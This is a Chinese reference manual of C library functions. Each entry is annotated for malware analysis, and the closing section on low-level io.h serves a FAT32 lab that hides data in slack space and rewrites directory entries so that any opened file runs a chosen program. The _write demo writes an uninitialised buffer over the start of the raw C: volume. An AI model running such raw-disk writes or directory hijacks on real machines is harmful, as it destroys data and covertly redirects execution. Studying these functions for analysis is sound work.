| 参数 | 说明 |
| :--- | :--- |
| `s` | 要填充的内存起始地址。 |
| `c` | 填充字节值。 |
| `n` | 要填充的字节数。 |

**返回值**：返回 `s`。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    char secret[16] = "TopSecretKey!!";
    memset(secret, 0, sizeof(secret));   // 内存清零，抹除密钥痕迹
    printf("清除完成\n");
    return 0;
}
```

**运行结果示范**：
```text
清除完成
```

**在病毒分析中的价值**：用于初始化结构、清零关键数据（抹除内存中的密钥/解密明文），检测到对敏感缓冲区的 `memset(..., 0, n)` 往往是反取证动作。


## strncpy（）：限长复制字符串

最多从源字符串复制 `n` 个字符到目标缓冲区（安全版 `strcpy`）。

**函数原型**：
```c
char *strncpy(
  char       *dest,                     // 目标缓冲区
  const char *src,                      // 源字符串
  size_t      n                         // 最大复制字节数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `dest` | 目标缓冲区。 |
| `src` | 源字符串。 |
| `n` | 最多复制 `n` 个字符。**注意**：若 `src` 长度 ≥ `n`，结果**不以 `\0` 结尾**；`src` 更短则剩余位置用 `\0` 填充。 |

**返回值**：返回 `dest`。

**⚠️ 安全提醒**：`strncpy` 不保证以 `\0` 结尾，通常应手动 `dest[n-1] = '\0'`。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    char name[16];
    strncpy(name, "this_is_a_very_long_path_name.exe", sizeof(name) - 1);
    name[sizeof(name) - 1] = '\0';          // 手动补结尾
    printf("截断结果: %s\n", name);
    return 0;
}
```

**运行结果示范**：
```text
截断结果: this_is_a_very_l
```

**在病毒分析中的价值**：恶意代码用 `strncpy` 按固定长度拷贝文件名/命令（防止溢出或对齐结构）。观察 `n` 参数与目标缓冲大小，能判断其数据结构布局，也可发现“疑似溢出”的不安全用法。

## strncmp（）：限长比较字符串

比较两个字符串的前 `n` 个字符（比较文件名前缀、协议标识常用）。

**函数原型**：
```c
int strncmp(
  const char *s1,                       // 字符串 1
  const char *s2,                       // 字符串 2
  size_t      n                         // 比较字节数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `s1` / `s2` | 要比较的字符串。 |
| `n` | 只比较前 `n` 个字符。 |

**返回值**：同 `strcmp`（0 相等 / `<0` 小于 / `>0` 大于）。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    const char *file = "C:\\Windows\\System32\\cmd.exe";
    if (strncmp(file, "C:\\Windows", 11) == 0) {
        printf("路径位于 Windows 目录\n");
    }
    return 0;
}
```

**运行结果示范**：
```text
路径位于 Windows 目录
```

**在病毒分析中的价值**：判断文件/命令是否以某前缀开头（如 `\\\\.\\PhysicalDrive`、`http://`）时常用 `strncmp`；样本据此决定走“磁盘写”还是“网络”分支。前缀字符串可作为分类特征。

## strrchr（）：从尾部查找字符

在字符串中查找**最后一次**出现指定字符的位置（取扩展名/文件名）。

**函数原型**：
```c
char *strrchr(
  const char *str,                      // 被查找字符串
  int         c                         // 目标字符
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str` | 被查找的字符串。 |
| `c` | 目标字符。 |

**返回值**：
- **找到**：返回指向最后出现处（含该字符）的指针
- **未找到**：返回 `NULL`

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    const char *path = "C:\\Users\\Public\\evil.dll";
    char *p = strrchr(path, '.');          // 定位扩展名分隔点
    if (p) {
        printf("扩展名: %s\n", p);
        if (strcmp(p, ".dll") == 0) {
            printf("是 DLL 文件\n");
        }
    }
    return 0;
}
```

**运行结果示范**：
```text
扩展名: .dll
是 DLL 文件
```

**在病毒分析中的价值**：恶意代码用 `strrchr` 判断下载/自建文件的扩展名，据此决定“直接加载(DLL)还是运行(EXE)”。断点可确认它准备以哪种方式执行载荷。


## strtok（）：按分隔符切分字符串

按分隔符集合把字符串拆成子串，常用于解析 CSV/配置/URL。

**函数原型**：
```c
char *strtok(
  char *str,                            // 要切分的字符串
  const char *delim                     // 分隔符集合
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str` | 首次调用传源字符串（会被**就地修改**，把分隔符替换为 `\0`）；后续传 `NULL` 继续取下一个子串。 |
| `delim` | 分隔符字符集合，如 `","`、`" ;="`。 |

**返回值**：返回当前子串指针；切分完毕返回 `NULL`。

**⚠️ 注意**：`strtok` 内部用静态变量保存状态，**不可重入**（多线程/嵌套解析请用 `strtok_r`/`strtok_s`）。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    char line[] = "id=1001,cmd=whoami,path=C:\\temp";
    char *tok = strtok(line, ",");
    while (tok) {
        printf("字段: %s\n", tok);
        tok = strtok(NULL, ",");
    }
    return 0;
}
```

**运行结果示范**：
```text
字段: id=1001
字段: cmd=whoami
字段: path=C:\temp
```

**在病毒分析中的价值**：解析 C2 下发指令或分隔配置文件时常用 `strtok`。断点能还原它“按什么分隔、取哪一段”，从而理解其命令语法与数据格式。

## memmove（）：可重叠内存复制

复制内存块，**源与目标允许重叠**（`memcpy` 不允许）。

**函数原型**：
```c
void *memmove(
  void       *dest,                     // 目标地址
  const void *src,                      // 源地址
  size_t      n                         // 字节数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `dest` | 目标地址。 |
| `src` | 源地址。 |
| `n` | 复制字节数。 |

**返回值**：返回 `dest`。

**使用示范**：
```c
#include <stdio.h>
#include <string.h>

int main() {
    char buf[] = "hello world";
    // 把 "world" 前移覆盖，重叠复制（memcpy 会出错，memmove 安全）
    memmove(buf + 2, buf + 6, 5);
    printf("结果: %s\n", buf);
    return 0;
}
```

**运行结果示范**：
```text
结果: heworldorld
```

**在病毒分析中的价值**：解密/解压算法常需在缓冲区内部搬移数据（如删掉填充、重排字节），样本用 `memmove` 而非 `memcpy` 常意味着存在重叠搬移逻辑，是还原其“解码后如何重组”的关键线索。


# C 标准库 (stdlib.h)

C 标准库中的 `stdlib.h`（Standard Library）提供了**通用工具函数**，包括动态内存管理（`malloc`/`free`）、程序控制（`exit`/`system`）、字符串转换（`atoi`）、随机数生成等。恶意代码分析中，该库的函数常用于内存分配、执行系统命令和环境变量操作。

## malloc（）：动态分配内存

从堆中分配指定大小的内存块，返回指向该内存块的指针。

**函数原型**：
```c
void *malloc(
  size_t size                           // 要分配的字节数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `size` | 要分配的字节数。如果传 `0`，行为由具体实现定义，通常返回 `NULL` 或一个唯一指针。 |

**返回值**：
- **成功**：返回指向已分配内存块的指针
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *pMem = (char *)malloc(100);

    if (pMem != NULL) {
        strcpy(pMem, "Hello, malloc!");
        printf("分配成功，内容: %s\n", pMem);
        free(pMem);
    } else {
        printf("内存分配失败\n");
    }

    return 0;
}
```

**运行结果示范**：
```text
分配成功，内容: Hello, malloc!
```

**在病毒分析中的价值**：病毒常使用 `malloc` 动态分配内存来存放解密后的代码、网络数据包或恶意负载。分析时应追踪分配后的内存如何被使用。


## calloc（）：分配并清零内存

分配 `num * size` 字节的内存，并**全部初始化为 0**。

**函数原型**：
```c
void *calloc(
  size_t num,                           // 元素个数
  size_t size                           // 每个元素大小
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `num` | 元素个数。 |
| `size` | 每个元素的字节数。总大小 = `num * size`（内部会做溢出检查）。 |

**返回值**：
- **成功**：返回已清零的内存指针
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    int *arr = (int *)calloc(10, sizeof(int));   // 10 个 int，初始全 0
    if (arr) {
        printf("arr[0] = %d\n", arr[0]);          // 0
        free(arr);
    }
    return 0;
}
```

**运行结果示范**：
```text
arr[0] = 0
```

**在病毒分析中的价值**：样本用 `calloc` 而非 `malloc`，往往需要“零初始化”的结构（如加解密上下文、网络包缓存），可据此判断其数据类型与后续用途。


## realloc（）：调整内存块大小

在保留原内容的前提下，把先前分配的内存块扩大或缩小。

**函数原型**：
```c
void *realloc(
  void  *ptr,                           // 原内存指针
  size_t new_size                       // 新大小
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `ptr` | `malloc`/`calloc`/`realloc` 返回的指针。传 `NULL` 等价于 `malloc(new_size)`。 |
| `new_size` | 新字节数；为 `0` 时相当于释放。 |

**返回值**：
- **成功**：返回新地址（可能不同于原地址）
- **失败**：返回 `NULL` 且**原块不变**

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *buf = (char *)malloc(16);
    strcpy(buf, "hello");

    buf = (char *)realloc(buf, 64);    // 扩容到 64 字节
    if (buf) {
        printf("扩容后内容: %s\n", buf);
        free(buf);
    }
    return 0;
}
```

**运行结果示范**：
```text
扩容后内容: hello
```

**在病毒分析中的价值**：恶意样本常先用小块缓冲接收数据，再根据实际长度 `realloc` 扩容（如逐步接收 shellcode），观察 `new_size` 参数可估算其准备装载的载荷规模。


## free（）：释放动态分配的内存

释放由 `malloc`、`calloc` 或 `realloc` 分配的内存块。

**函数原型**：
```c
void free(
  void *pMem                            // 要释放的内存指针
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `pMem` | 指向先前由 `malloc`、`calloc` 或 `realloc` 分配的内存块的指针。传 `NULL` 时，`free` 不执行任何操作。 |

**返回值**：无返回值。

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *pMem = (char *)malloc(100);

    if (pMem != NULL) {
        printf("分配成功\n");
        free(pMem);
        printf("已释放\n");
    }

    return 0;
}
```

**运行结果示范**：
```text
分配成功
已释放
```

**在病毒分析中的价值**：分析 `free` 的调用位置可以了解病毒的内存生命周期，追踪其何时释放解密后的代码或数据，避免留下痕迹。对 `free` 之后仍被引用的“悬垂指针”样本，还可能是堆溢出利用的入口。


## system（）：执行系统命令

调用系统命令解释器（Windows 为 `cmd.exe /c`，Linux 为 `/bin/sh -c`）执行字符串命令。

**函数原型**：
```c
int system(
  const char *command                   // 要执行的命令字符串
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `command` | 命令字符串，如 `"whoami"`、`"ipconfig"`。传 `NULL` 时仅探测解释器是否存在（返回非 0 表示存在）。 |

**返回值**：
- 正常执行：返回命令的退出状态码（依平台实现而不同）
- `command == NULL`：返回非 0 表示解释器可用

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    // 演示：查询网络配置（真实样本常替换为下载器/挖矿命令）
    int ret = system("ipconfig");
    printf("命令退出码: %d\n", ret);
    return 0;
}
```

**运行结果示范**：
```text
（ipconfig 输出略）
命令退出码: 0
```

**在病毒分析中的价值**：恶意代码用 `system` 或 `WinExec` 快速拉起命令行（如关防火墙、加计划任务、注册表持久化）。看到 `system` 的字符串参数几乎等于直接读到其意图命令，应作为重点提取对象。


## exit（）：终止进程

立即终止当前进程，并把状态码返回给操作系统（父进程可读取）。

**函数原型**：
```c
void exit(
  int status                            // 退出状态码
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `status` | 进程退出码。`0`/`EXIT_SUCCESS` 表示正常，`EXIT_FAILURE`(`1`) 表示出错。 |

**返回值**：无返回值（不返回）。

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    FILE *fp = fopen("C:\\nonexistent", "r");
    if (!fp) {
        printf("打开失败，退出\n");
        exit(EXIT_FAILURE);
    }
    fclose(fp);
    return 0;
}
```

**运行结果示范**：
```text
打开失败，退出
```

**在病毒分析中的价值**：恶意样本在“检测到沙箱/调试器/虚拟机”时常用 `exit` 快速自杀以避免被分析；样本执行完载荷后退出也能帮助定位其“主逻辑结束点”。


## atoi（）：字符串转整数

把字符串开头的十进制数字解析为 `int`，忽略前导空白。

**函数原型**：
```c
int atoi(
  const char *str                       // 要转换的字符串
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str` | 形如 `"123"`、`"-45"` 的字符串；首个非法字符处停止解析。无法转换时返回 `0`（无错误指示）。 |

**返回值**：转换得到的 `int`。

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *port = "4444";
    int p = atoi(port);
    printf("端口: %d (0x%X)\n", p, p);
    return 0;
}
```

**运行结果示范**：
```text
端口: 4444 (0x115C)
```

**在病毒分析中的价值**：远控木马常从配置里 `atoi` 解析端口号、延时秒数等数字字段。在 `atoi` 下断即可观察到其 C2 端口或休眠时间，辅助判断恶意行为。


## getenv（）：读取环境变量

按名称读取当前进程的环境变量，返回其字符串值。

**函数原型**：
```c
char *getenv(
  const char *name                      // 环境变量名
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `name` | 环境变量名，如 `"TEMP"`、`"APPDATA"`、`"USERPROFILE"`。 |

**返回值**：
- **存在**：返回指向变量值的字符串（不可修改）
- **不存在**：返回 `NULL`

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *tmp = getenv("TEMP");
    printf("临时目录: %s\n", tmp ? tmp : "(未设置)");
    return 0;
}
```

**运行结果示范**：
```text
临时目录: C:\Users\test\AppData\Local\Temp
```

**在病毒分析中的价值**：恶意代码常先 `getenv("APPDATA")`/`getenv("TEMP")` 取得“用户可写目录”再拼接文件名落盘，避免写系统目录触发权限问题。该调用点是定位其落地路径的起点。


## strtol（）：字符串转长整数

把字符串按指定进制解析为 `long`，可带正负号与错误检测（`atoi` 的安全增强版）。

**函数原型**：
```c
long strtol(
  const char *str,                      // 要转换的字符串
  char      **endptr,                   // 停止位置输出（可 NULL）
  int         base                      // 进制（0/2/8/10/16）
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `str` | 源字符串。 |
| `endptr` | 可选，接收“第一个未转换字符”的位置，用于校验是否整串都合法。 |
| `base` | 进制；传 `0` 时自动识别前缀（`0x`=16 进制、`0`=8 进制、否则 10 进制）。 |

**返回值**：返回解析的 `long`；无法转换返回 `0`，溢出设置 `errno = ERANGE`。

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *end = NULL;
    long addr = strtol("0x7FF00000", &end, 0);   // 解析十六进制地址
    if (*end == '\0') {
        printf("解析地址: 0x%lX\n", addr);
    }
    return 0;
}
```

**运行结果示范**：
```text
解析地址: 0x7FF00000
```

**在病毒分析中的价值**：解析 C2 下发的十六进制地址/配置数字（`0x` 前缀自动识别）常用 `strtol`。比 `atoi` 更能处理带前缀与校验的数据，断点能直接读出它要写入或跳转的目标地址。


## srand（）：设置随机种子

为 `rand()` 初始化伪随机数生成器种子；相同种子产生相同随机序列。

**函数原型**：
```c
void srand(
  unsigned int seed                     // 种子值
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `seed` | 随机种子。恶意代码常以 `time(NULL)`、`GetTickCount()` 或当前 PID 作种子。 |

**返回值**：无返回值。

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    srand((unsigned int)time(NULL));   // 以时间作种子（常见但可预测）
    int key = rand() % 256;
    printf("随机密钥: %d\n", key);
    return 0;
}
```

**运行结果示范**：
```text
随机密钥: 137
```

**在病毒分析中的价值**：若样本用 `srand(seed)` 生成的序列做 XOR 密钥流，只要知道种子（时间/常量）就能**完整复现解密流**。发现 `srand` 后结合其参数（尤其固定种子或可预测种子）即可编写解密脚本，无需逆向全部解密代码。

## rand（）：生成伪随机数

返回 `[0, RAND_MAX]` 之间的伪随机整数，序列取决于上次 `srand` 的种子。

**函数原型**：
```c
int rand(void);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| （无参数） | 返回当前伪随机序列中的下一个数。 |

**返回值**：`0 ~ RAND_MAX`（`RAND_MAX` 通常为 32767）的整数。

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    for (int i = 0; i < 5; i++) {
        printf("%d ", rand() % 256);   // 生成 0-255 字节（如 XOR key 流）
    }
    printf("\n");
    return 0;
}
```

**运行结果示范**：
```text
41 184 67 231 12
```

**在病毒分析中的价值**：自实现的“加解密”若基于 `rand()`（而非安全算法），本质是**弱加密/可破解**。分析时在 `rand()` 下断收集若干输出即可判断并复现其密钥流，进而解密被保护的配置或载荷。


## abs（）：取整数绝对值

返回整数的绝对值。

**函数原型**：
```c
int abs(
  int x                                // 输入整数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `x` | 要取绝对值的整数。注意 `abs(INT_MIN)` 溢出未定义。 |

**返回值**：返回 `|x|`。

**使用示范**：
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    int delta = -3000;
    printf("绝对偏差: %d\n", abs(delta));
    return 0;
}
```

**运行结果示范**：
```text
绝对偏差: 3000
```

**在病毒分析中的价值**：样本常取两次时间/计数器差值的绝对值来判断“是否真的过去了这么久”，用于反沙箱计时。见 `abs` 包住时间差，通常就是速度/延迟探测。


# C 运行时底层 I/O (io.h)

以下属于 MSVC CRT 的**底层 I/O（POSIX 风格）**，与 `stdio` 的缓冲 `FILE*` 不同：它们直接操作文件描述符 `int fd`，配合 `O_BINARY` 可以**原样读写不含换行转换的二进制数据（如磁盘扇区）**。FAT32“三不管”实验若不引入 Windows API，也可用这套函数完成同样的扇区读写。

## _open（）：底层打开文件/设备

底层打开一个文件或设备，返回整数文件描述符（`FILE*` 之外的另一套句柄体系）。

**函数原型**：
```c
int _open(
  const char* filename,    // 路径（Windows 下也支持 \\\\.\\C: 设备路径）
  int        oflag,        // O_RDONLY / O_RDWR / O_CREAT / O_BINARY ...
  ...                      // 第三个参数：创建时权限，如 _S_IREAD | _S_IWRITE
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `filename` | 文件名或设备路径。`O_BINARY` 常与读盘配合使用。 |
| `oflag` | 组合标志：`_O_RDONLY`/`_O_RDWR`/`_O_CREAT`/`_O_TRUNC`/`_O_BINARY` 等。**读扇区必须带 `_O_BINARY`**，否则回车换行被转换导致字节错位。 |

**返回值**：
- **成功**：返回非负的文件描述符（如 `3`）
- **失败**：返回 `-1`（并设置全局 `errno`）

**使用示范**：
```c
#include <fcntl.h>
#include <io.h>
#include <stdio.h>

int main() {
    // 以只读二进制方式打开 C 卷
    int fd = _open("\\\\.\\C:", _O_RDONLY | _O_BINARY);
    if (fd == -1) { perror("_open"); return 1; }
    printf("打开成功 fd=%d\n", fd);
    _close(fd);
    return 0;
}
```

**运行结果示范**：
```text
打开成功 fd=3
```

**在该 FAT32 项目中的用途**：以 `_O_BINARY` 打开磁盘设备/镜像文件后，后续 `_lseeki64 + _read/_write` 可以精确按字节读写任意扇区，而不会像文本模式那样被系统“翻译”破坏二进制布局。⚠️ 原始写盘仍需管理员权限并建议先锁卷。

## _read（）：底层读取二进制数据

从文件描述符读入指定字节数到缓冲区（用于直接读取扇区内容）。

**函数原型**：
```c
int _read(
  int        fd,       // _open 返回的描述符
  void*      buffer,   // 输出缓冲区
  unsigned   count     // 期望读取字节数（如 512）
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `fd` | 已打开的底层描述符。 |
| `count` | 请求字节数。FAT 扇区通常 `512` 字节。 |

**返回值**：
- **成功**：返回实际读取的字节数（可能小于 `count`，到末尾为 `0`）
- **失败**：返回 `-1`

**使用示范**：
```c
#include <fcntl.h>
#include <io.h>
#include <stdio.h>

int main() {
    int fd = _open("\\\\.\\C:", _O_RDONLY | _O_BINARY);
    if (fd == -1) return 1;
    unsigned char boot[512];
    int n = _read(fd, boot, sizeof(boot));   // 读出引导扇区
    printf("读到 %d 字节，跳转指令=%02X\n", n, boot[0]);
    _close(fd);
    return 0;
}
```

**运行结果示范**：
```text
读到 512 字节，跳转指令=EB
```

**在该 FAT32 项目中的用途**：`_lseeki64` 定位到某扇区后用 `_read` 把 BPB/目录项读进内存解析，是"找三不管空间 / 读目录表"的第一步。

## _write（）：底层写入二进制数据

从缓冲区把指定字节数写回文件描述符（用于回写被修改的目录表/扇区）。

**函数原型**：
```c
int _write(
  int        fd,       // _open 返回的描述符
  const void* buffer,  // 要写的数据
  unsigned   count     // 要写的字节数
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `fd` | 需以 `_O_RDWR` 打开。 |
| `count` | 写入字节数，通常为整扇区 512。 |

**返回值**：
- **成功**：返回实际写入的字节数
- **失败**：返回 `-1`

**使用示范**：
```c
#include <fcntl.h>
#include <io.h>
#include <string.h>

int main() {
    int fd = _open("\\\\.\\C:", _O_RDWR | _O_BINARY);
    if (fd == -1) return 1;
    unsigned char dir[512];
    // ……修改目录项后回写原扇区……
    int w = _write(fd, dir, sizeof(dir));
    printf("写回 %d 字节\n", w);
    _close(fd);
    return 0;
}
```

**运行结果示范**：
```text
写回 512 字节
```

**在该 FAT32 项目中的用途**：目标 3（修改目录表让“打开任意文件都命中设计程序”）的本质，就是在内存改好目录项后按原扇区位置 `_write` 回去。

## _lseeki64（）：按 64 位偏移移动底层文件指针

底层描述符的“扇区寻址”——把读写位置移到第 N 扇区起点（偏移 = N × 512）。

**函数原型**：
```c
__int64 _lseeki64(
  int      fd,       // 文件描述符
  __int64  pos,      // 目标偏移（64 位）
  int      origin    // SEEK_SET / SEEK_CUR / SEEK_END
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `pos` | 偏移量。访问第 N 扇区时用 `(__int64)N * 512`。 |
| `origin` | `SEEK_SET`(从头)、`SEEK_CUR`(当前)、`SEEK_END`(从尾)。 |

**返回值**：
- **成功**：返回移动后的偏移量（`__int64`）
- **失败**：返回 `-1`

**使用示范**：
```c
#include <fcntl.h>
#include <io.h>
#include <stdio.h>

int main() {
    int fd = _open("\\\\.\\C:", _O_RDONLY | _O_BINARY);
    if (fd == -1) return 1;
    __int64 sector = 2048;               // 示例：想读第 2048 扇区
    __int64 off = _lseeki64(fd, sector * 512, SEEK_SET);
    if (off != -1) printf("已定位到偏移 %I64d\n", off);
    _close(fd);
    return 0;
}
```

**运行结果示范**：
```text
已定位到偏移 1048576
```

**在该 FAT32 项目中的用途**：等价于 Windows API 的 `SetFilePointerEx`——读写任意扇区（含"三不管"隐藏空间）都靠它一次性把指针搬到目标偏移。

## _close（）：关闭底层描述符

关闭 `_open` 打开的底层文件描述符并释放系统资源。

**函数原型**：
```c
int _close(
  int fd    // 要关闭的描述符
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `fd` | `_open` 返回的描述符。 |

**返回值**：
- **成功**：返回 `0`
- **失败**：返回 `-1`

**使用示范**：
```c
#include <fcntl.h>
#include <io.h>

int main() {
    int fd = _open("data.bin", _O_RDWR | _O_CREAT | _O_BINARY, _S_IREAD | _S_IWRITE);
    if (fd == -1) return 1;
    // ……读写……
    if (_close(fd) == 0) {
        // 关闭成功
    }
    return 0;
}
```

**运行结果示范**：
```text
（无输出；返回 0 即成功）
```

**在该 FAT32 项目中的用途**：实验结束或出错路径上关闭描述符，避免句柄泄漏导致后续无法重新打开卷写回数据。
